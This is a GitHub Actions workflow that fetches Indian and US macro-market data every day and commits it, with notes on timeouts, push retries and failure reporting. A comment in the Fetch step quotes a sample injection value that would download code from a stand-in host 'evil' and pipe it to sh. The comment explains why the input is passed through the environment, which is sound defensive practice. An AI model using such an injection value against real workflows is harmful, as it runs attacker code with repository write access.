name: refresh

on:
  schedule:
    # 02:30 UTC daily = 08:00 IST, after the previous US session has settled
    # and before the Indian market day gets going.
    - cron: '30 2 * * *'
  workflow_dispatch:
    inputs:
      only:
        description: 'Run a single source (market, rbi_forward_book, rbi_wss, rbihub, nsdl_fpi, india_misc)'
        required: false
        default: ''

permissions:
  contents: write

concurrency:
  group: refresh
  cancel-in-progress: false

jobs:
  refresh:
    runs-on: ubuntu-latest
    timeout-minutes: 60
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
          cache: pip

      - run: pip install -r requirements.txt

      - name: Parser smoke tests
        run: python selftest.py

      - name: Fetch
        id: fetch
        # Step timeout is BELOW the job timeout on purpose. The first run died on
        # the job timeout and the commit step never executed, so nothing was saved.
        # Capping the step means a slow fetch is killed but the commit still runs.
        timeout-minutes: 30
        continue-on-error: true          # commit partial results even on failure
        env:
          # Passed via env, never interpolated into the shell: an input like
          # `x"; curl evil | sh; echo "` would otherwise execute with a
          # contents:write token.
          ONLY: ${{ github.event.inputs.only }}
        run: |
          if [ -n "$ONLY" ]; then
            python run.py --only "$ONLY"
          else
            python run.py
          fi

      - name: Commit
        if: always()
        run: |
          git config user.name  "macro-data-bot"
          git config user.email "actions@users.noreply.github.com"
          git add -A
          if git diff --cached --quiet; then
            echo "no changes"
          else
            git commit -m "refresh $(date -u +%Y-%m-%dT%H:%MZ)"
            # Retry with a rebase: a human push landing between checkout and here
            # would otherwise fail the step under `bash -e` and redden the run.
            for i in 1 2 3; do
              git push && break
              echo "push rejected, rebasing (attempt $i)"
              git pull --rebase --autostash origin main || true
              sleep 5
            done
          fi

      - name: Surface failures
        if: always() && steps.fetch.outcome != 'success'
        run: |
          # A wall-clock kill and a data-quality error look identical in the
          # Actions UI unless we distinguish them here.
          if [ -f MANIFEST.md ]; then
            echo "::error::Fetch step did not succeed - see the manifest below."
            sed -n '1,60p' MANIFEST.md
          else
            echo "::error::Fetch step produced no manifest at all - it was almost"
            echo "certainly killed by the 30-minute step timeout."
          fi
          exit 1
